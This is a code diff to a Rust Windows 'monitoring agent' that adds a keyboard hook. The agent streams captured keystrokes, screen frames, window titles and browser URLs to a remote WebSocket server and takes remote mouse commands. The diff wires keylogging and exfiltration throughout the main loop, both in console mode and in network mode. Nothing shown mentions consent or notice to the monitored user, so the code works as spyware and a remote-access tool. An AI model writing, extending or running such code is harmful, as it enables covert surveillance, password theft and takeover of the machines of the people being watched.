@@ -1,46 +1,68 @@
 //! # Windows Monitoring Agent
 //!
-//! Connects to a remote WebSocket server and:
+//! Connects to a remote WebSocket server and streams real-time telemetry.
 //!
-//! | Direction | Data                                   | WS frame type |
-//! |-----------|----------------------------------------|---------------|
-//! | Outbound  | JPEG-encoded screen frames (≤ 15 fps)  | `Binary`      |
-//! | Outbound  | Active browser URL (every 2 s)         | `Text` (JSON) |
-//! | Inbound   | Mouse control commands                 | `Text` (JSON) |
+//! ## Outbound frames (agent → server)
+//!
+//! | Event                        | WS frame type  | JSON `"type"` field |
+//! |------------------------------|---------------|---------------------|
+//! | Screen frame (≤ 15 fps)      | `Binary`      | —                   |
+//! | Buffered keystrokes          | `Text` (JSON) | `"keys"`            |
+//! | AFK transition               | `Text` (JSON) | `"afk"`             |
+//! | Return from AFK              | `Text` (JSON) | `"active"`          |
+//! | Foreground window changed    | `Text` (JSON) | `"window_focus"`    |
+//! | Active browser URL changed   | `Text` (JSON) | `"url"`             |
+//!
+//! ## Inbound frames (server → agent)
+//!
+//! | Command      | WS frame type  | JSON `"type"` field |
+//! |--------------|---------------|---------------------|
+//! | Mouse move   | `Text` (JSON) | `"MouseMove"`       |
+//! | Mouse click  | `Text` (JSON) | `"MouseClick"`      |
 //!
 //! ## Architecture
 //!
 //! ```text
-//!  ┌──────────────┐   Vec<u8>   ┌──────────────────────────────────────────┐
-//!  │ capture      │ ──────────► │                                          │
-//!  │ (OS thread)  │  mpsc(4)    │   run_session  (Tokio task)              │
-//!  └──────────────┘             │                                          │
-//!                               │  tokio::select!                          │
-//!  ┌──────────────┐  Message    │   ├─ frame_ticker   → Binary WS frame   │
-//!  │ WS writer    │ ◄────────── │   ├─ url_ticker     → Text  WS frame    │
-//!  │ (Tokio task) │  mpsc(16)   │   └─ ws_rx.next()  → InputController   │
-//!  └──────────────┘             │                                          │
-//!                               └──────────────────────────────────────────┘
+//!  ┌─────────────────┐  Vec<u8>   ┌───────────────────────────────────────────┐
+//!  │ capture         │ ─────────► │                                           │
+//!  │ (OS thread)     │  mpsc(4)   │  run_session  (Tokio task)                │
+//!  └─────────────────┘            │                                           │
+//!                                 │  tokio::select!  (biased, in order)       │
+//!  ┌─────────────────┐  Message   │   1. ws_rx.next()   → InputController    │
+//!  │ WS writer       │ ◄───────── │   2. frame_ticker   → Binary frame       │
+//!  │ (Tokio task)    │  mpsc(16)  │   3. url_ticker     → "url" JSON         │
+//!  └─────────────────┘            │   4. key_rx.recv()  → "keys/afk" JSON    │
+//!                                 │   5. window_ticker  → "window_focus" JSON │
+//!  ┌─────────────────┐            │                                           │
+//!  │ keylogger       │  unbounded │                                           │
+//!  │ (2 OS threads + │ ─────────► │                                           │
+//!  │  1 Tokio task)  │  mpsc      └───────────────────────────────────────────┘
+//!  └─────────────────┘
 //! ```
+//!
+//! When `WS_URL` is not set the agent runs in **console mode**: all events are
+//! printed to stdout instead of being sent over WebSocket.  Screen capture is
+//! disabled in console mode.
 //!
 //! ## Environment variables
 //!
-//! | Variable | Default              | Description             |
-//! |----------|----------------------|-------------------------|
-//! | `WS_URL` | `ws://127.0.0.1:9000`| Remote WebSocket server |
-//! | `RUST_LOG`| `info`              | Log filter string       |
+//! | Variable   | Description                                     |
+//! |------------|-------------------------------------------------|
+//! | `WS_URL`   | WebSocket server, e.g. `ws://192.168.1.1:9000` |
+//! | `RUST_LOG` | Log filter string (default: `info`)             |
 
 mod capture;
 mod input;
+mod keylogger;
 mod url_scraper;
 mod window_tracker;
 
 use std::time::Duration;
 
 use anyhow::{Context, Result};
-use bytes::Bytes;
 use futures_util::{SinkExt, StreamExt};
 use input::InputController;
+use keylogger::InputEvent;
 use tokio::sync::mpsc;
 use window_tracker::WindowTracker;
 use tokio::time::{interval, MissedTickBehavior};
@@ -101,13 +123,20 @@ async fn main() -> Result<()> {
 
     info!("Windows monitoring agent v{}", env!("CARGO_PKG_VERSION"));
     info!("Window poll interval  : {}ms", WINDOW_POLL_INTERVAL_MS);
+    info!("AFK threshold         : {}s",  keylogger::AFK_THRESHOLD_SECS);
+
+    // ── Keylogger (runs in all modes) ─────────────────────────────────────
+    // Channel is created once; the hook lives for the entire process lifetime.
+    let (key_tx, key_rx) = mpsc::unbounded_channel::<InputEvent>();
+    keylogger::start(key_tx).context("Failed to start keylogger")?;
+    info!("Keyboard hook installed.");
 
     match ws_url {
         // ── Console-only mode (no server) ─────────────────────────────────
         None => {
             info!("WS_URL not set → running in CONSOLE mode (Ctrl-C to exit).");
             info!("──────────────────────────────────────────────────────────");
-            run_console_mode().await;
+            run_console_mode(key_rx).await;
         }
 
         // ── WebSocket mode ────────────────────────────────────────────────
@@ -122,7 +151,7 @@ async fn main() -> Result<()> {
                 .context("Failed to start screen capture")?;
             info!("Screen capture initialised on dedicated OS thread.");
 
-            run_reconnect_loop(&url, frame_rx).await;
+            run_reconnect_loop(&url, frame_rx, key_rx).await;
         }
     }
 
@@ -135,15 +164,16 @@ async fn main() -> Result<()> {
 
 /// Run a local print loop – useful while developing without a server.
 ///
-/// Prints a line to stdout whenever:
-/// - The foreground window title or executable changes (≤ 200 ms latency).
-/// - The active browser URL changes (checked every 2 s).
+/// Prints to stdout on:
+/// - Foreground window / tab title change  (≤ 200 ms latency)
+/// - Active browser URL change             (every 2 s)
+/// - Buffered keystrokes                   (on window switch / 5-s silence / 200 chars)
+/// - AFK / Active transitions
 ///
-/// Screen capture is intentionally **disabled** in this mode; it is only
-/// useful once the WebSocket transport is in place.
-async fn run_console_mode() {
-    let mut win_tracker  = WindowTracker::new();
-    let mut last_url     = String::new();
+/// Screen capture is intentionally **disabled** in this mode.
+async fn run_console_mode(mut key_rx: mpsc::UnboundedReceiver<InputEvent>) {
+    let mut win_tracker = WindowTracker::new();
+    let mut last_url    = String::new();
 
     let mut window_ticker = interval(Duration::from_millis(WINDOW_POLL_INTERVAL_MS));
     let mut url_ticker    = interval(Duration::from_secs(2));
@@ -155,22 +185,43 @@ async fn run_console_mode() {
         tokio::select! {
             biased;
 
-            // ── Window / tab title ─────────────────────────────────────────
-            _ = window_ticker.tick() => {
-                if let Some(event) = win_tracker.poll() {
-                    let app   = if event.app.is_empty()   { "—".to_string() } else { event.app.clone() };
-                    let title = if event.title.is_empty() { "(desktop)".to_string() } else { event.title.clone() };
-                    println!("[WINDOW] app={app:<20}  title={title}");
+            // ── Keystrokes / AFK events ───────────────────────────────────
+            event = key_rx.recv() => {
+                match event {
+                    Some(InputEvent::Keys { text, app, window, .. }) => {
+                        let display = text
+                            .lines()
+                            .map(|l| format!("         {l}"))
+                            .collect::<Vec<_>>()
+                            .join("\n");
+                        println!("[KEYS]   {app:<20}  {window}");
+                        println!("{display}");
+                    }
+                    Some(InputEvent::Afk { idle_secs }) => {
+                        println!("[AFK]    No input for {idle_secs}s");
+                    }
+                    Some(InputEvent::Active) => {
+                        println!("[ACTIVE] User returned from AFK");
+                    }
+                    None => break,
                 }
             }
 
-            // ── Browser URL ────────────────────────────────────────────────
+            // ── Window / tab title ────────────────────────────────────────
+            _ = window_ticker.tick() => {
+                if let Some(event) = win_tracker.poll() {
+                    let app   = if event.app.is_empty()   { "—".into() } else { event.app.clone() };
+                    let title = if event.title.is_empty() { "(desktop)".into() } else { event.title.clone() };
+                    println!("[WINDOW] {app:<20}  {title}");
+                }
+            }
+
+            // ── Browser URL (every 2 s) ───────────────────────────────────
             _ = url_ticker.tick() => {
-                if let Some(url) = url_scraper::get_active_url() {
-                    // Only print when the URL actually changes.
-                    if url != last_url {
-                        println!("[URL]    {url}");
-                        last_url = url;
+                if let Some(info) = url_scraper::get_active_url() {
+                    if info.url != last_url {
+                        println!("[URL]    {}  ({})", info.url, info.browser_name);
+                        last_url = info.url.clone();
                     }
                 }
             }
@@ -184,7 +235,11 @@ async fn run_console_mode() {
 
 /// Attempt to connect to `ws_url` and run a session; reconnect on any
 /// failure.  This function never returns under normal operation.
-async fn run_reconnect_loop(ws_url: &str, mut frame_rx: mpsc::Receiver<Vec<u8>>) {
+async fn run_reconnect_loop(
+    ws_url: &str,
+    mut frame_rx: mpsc::Receiver<Vec<u8>>,
+    mut key_rx: mpsc::UnboundedReceiver<InputEvent>,
+) {
     loop {
         info!("Connecting to {ws_url} …");
 
@@ -194,7 +249,7 @@ async fn run_reconnect_loop(ws_url: &str, mut frame_rx: mpsc::Receiver<Vec<u8>>)
                     "WebSocket connected (HTTP {}).",
                     response.status().as_u16()
                 );
-                match run_session(ws_stream, &mut frame_rx).await {
+                match run_session(ws_stream, &mut frame_rx, &mut key_rx).await {
                     Ok(()) => info!("Session closed gracefully."),
                     Err(e) => error!("Session terminated with error: {e:#}"),
                 }
@@ -215,21 +270,13 @@ async fn run_reconnect_loop(ws_url: &str, mut frame_rx: mpsc::Receiver<Vec<u8>>)
 
 /// Drive a single active WebSocket session until it closes or errors.
 ///
-/// # Concurrency model
-///
-/// ```text
-///  frame_rx ──(try_recv)──┐
-///  url_ticker             │
-///  window_ticker ─────────┼── tokio::select! ──► out_tx ──► writer task ──► ws_tx
-///  ws_rx (inbound cmds) ──┘                                 (serialised writes)
-/// ```
-///
 /// The *writer task* owns the `SinkExt` write half of the socket; all other
 /// producers enqueue [`Message`]s on `out_tx` so there is a single writer
 /// and no `Mutex` is needed.
 async fn run_session(
     ws_stream: WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>,
     frame_rx: &mut mpsc::Receiver<Vec<u8>>,
+    key_rx: &mut mpsc::UnboundedReceiver<InputEvent>,
 ) -> Result<()> {
     let (mut ws_tx, mut ws_rx) = ws_stream.split();
 
@@ -335,10 +382,7 @@ async fn run_session(
                 }
 
                 if let Some(jpeg) = latest {
-                    // tungstenite >= 0.21 expects `Bytes` for Binary frames.
-                    // If you're on an older version, change to:
-                    //   Message::Binary(jpeg)
-                    let msg = Message::Binary(Bytes::from(jpeg));
+                    let msg = Message::Binary(jpeg);
                     if out_tx.send(msg).await.is_err() {
                         break Err(anyhow::anyhow!(
                             "Outbound channel closed; writer task exited unexpectedly."
@@ -348,15 +392,14 @@ async fn run_session(
             }
 
             // ── Branch 3: active browser URL ──────────────────────────────
-            //
-            // Poll every 2 seconds.  `get_active_url` is a fast synchronous
-            // Windows UI-Automation call; no `spawn_blocking` is needed.
             _ = url_ticker.tick() => {
-                if let Some(url) = url_scraper::get_active_url() {
+                if let Some(info) = url_scraper::get_active_url() {
                     let payload = serde_json::json!({
-                        "type": "url",
-                        "url":  url,
-                        "ts":   unix_timestamp_secs(),
+                        "type"    : "url",
+                        "url"     : info.url,
+                        "title"   : info.title,
+                        "browser" : info.browser_name,
+                        "ts"      : unix_timestamp_secs(),
                     })
                     .to_string();
 
@@ -368,7 +411,38 @@ async fn run_session(
                 }
             }
 
-            // ── Branch 4: foreground window / tab changes ─────────────────
+            // ── Branch 4: keystrokes / AFK ───────────────────────────────
+            event = key_rx.recv() => {
+                let payload = match event {
+                    Some(InputEvent::Keys { text, app, window, ts }) => {
+                        serde_json::json!({
+                            "type"   : "keys",
+                            "text"   : text,
+                            "app"    : app,
+                            "window" : window,
+                            "ts"     : ts,
+                        })
+                        .to_string()
+                    }
+                    Some(InputEvent::Afk { idle_secs }) => {
+                        serde_json::json!({ "type": "afk", "idle_secs": idle_secs,
+                                            "ts": unix_timestamp_secs() })
+                        .to_string()
+                    }
+                    Some(InputEvent::Active) => {
+                        serde_json::json!({ "type": "active", "ts": unix_timestamp_secs() })
+                        .to_string()
+                    }
+                    None => break Ok(()),  // keylogger shut down
+                };
+                if out_tx.send(Message::Text(payload)).await.is_err() {
+                    break Err(anyhow::anyhow!(
+                        "Outbound channel closed; writer task exited unexpectedly."
+                    ));
+                }
+            }
+
+            // ── Branch 5: foreground window / tab changes ─────────────────
             //
             // Polls `GetForegroundWindow` + `GetWindowTextW` every
             // WINDOW_POLL_INTERVAL_MS.  Only emits an event when the HWND
